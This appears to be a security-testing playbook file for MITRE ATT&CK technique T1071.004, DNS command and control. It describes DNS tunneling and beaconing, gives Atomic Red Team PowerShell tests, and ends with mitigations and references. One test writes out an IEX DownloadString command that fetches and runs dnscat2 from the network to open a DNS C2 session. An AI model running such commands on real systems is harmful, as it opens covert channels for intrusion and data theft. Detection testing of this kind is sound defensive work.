---
name: "T1071.004_dns"
description: "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1071.004
  - command-and-control
  - linux
  - macos
  - windows
  - network-devices
  - esxi
  - sub-technique
technique_id: "T1071.004"
tactic: "command-and-control"
all_tactics:
  - command-and-control
platforms:
  - Linux
  - macOS
  - Windows
  - Network Devices
  - ESXi
mitre_url: "https://attack.mitre.org/techniques/T1071/004"
tech_stack:
  - linux
  - macos
  - windows
  - network devices
  - esxi
cwe_ids:
  - CWE-300
chains_with:
  - T1071
  - T1071.001
  - T1071.002
  - T1071.003
  - T1071.005
prerequisites:
  - T1071
severity_boost:
  T1071: "Chain with T1071 for deeper attack path"
  T1071.001: "Chain with T1071.001 for deeper attack path"
  T1071.002: "Chain with T1071.002 for deeper attack path"
---

# T1071.004 DNS

> **Sub-technique of:** T1071

## High-Level Description

Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.

DNS beaconing may be used to send commands to remote systems via DNS queries. A DNS beacon is created by tunneling DNS traffic (i.e. Protocol Tunneling). The commands may be embedded into different DNS records, for example, TXT or A records. DNS beacons may be difficult to detect because the beacons infrequently communicate with infected devices. Infrequent communication conceals the malicious DNS traffic with normal DNS traffic.

## Kill Chain Phase

- Command and Control (TA0011)

**Platforms:** Linux, macOS, Windows, Network Devices, ESXi

## What to Check

- [ ] Identify if DNS technique is applicable to target environment
- [ ] Check Linux systems for indicators of DNS
- [ ] Check macOS systems for indicators of DNS
- [ ] Check Windows systems for indicators of DNS
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: DNS Large Query Volume

This test simulates an infected host sending a large volume of DNS queries to a command and control server.
The intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.
A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.

**Supported Platforms:** windows

```powershell
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
```

### Atomic Test 2: DNS Regular Beaconing

This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.
This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.

**Supported Platforms:** windows

```powershell
Set-Location "PathToAtomicsFolder"
.\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
```

### Atomic Test 3: DNS Long Domain Query

This test simulates an infected host returning data to a command and control server using long domain names.
The simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.
 Upon execution, DNS information about the domain will be displayed for each callout.

**Supported Platforms:** windows

```powershell
Set-Location "PathToAtomicsFolder"
.\T1071.004\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
```

### Atomic Test 4: DNS C2

This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
The following blogs have more information.

https://github.com/iagox86/dnscat2

https://github.com/lukebaggett/dnscat2-powershell

**Supported Platforms:** windows

```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to DNS by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1071.004 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1037 Filter Network Traffic
Consider filtering DNS requests to unknown, untrusted, or known bad domains and resources. Resolving DNS requests with on-premise/proxy servers may also disrupt adversary attempts to conceal data within DNS packets.

### M1031 Network Intrusion Prevention
Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.


## Detection

### Behavioral Detection of DNS Tunneling and Application Layer Abuse


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| DNS technique applicable | Medium | Command And Control |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-300 | Channel Accessible by Non-Endpoint |


## References

- [Medium DnsTunneling](https://medium.com/@galolbardes/learn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000)
- [University of Birmingham C2](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)
- [OilRig Uses Updated BONDUPDATER to Target Middle Eastern Government](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/)
- [PAN DNS Tunneling](https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling)
- [DNS Beacons](https://vercara.digicert.com/resources/dns-beacons#page_top)
- [Atomic Red Team - T1071.004](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1071.004)
- [MITRE ATT&CK - T1071.004](https://attack.mitre.org/techniques/T1071/004)
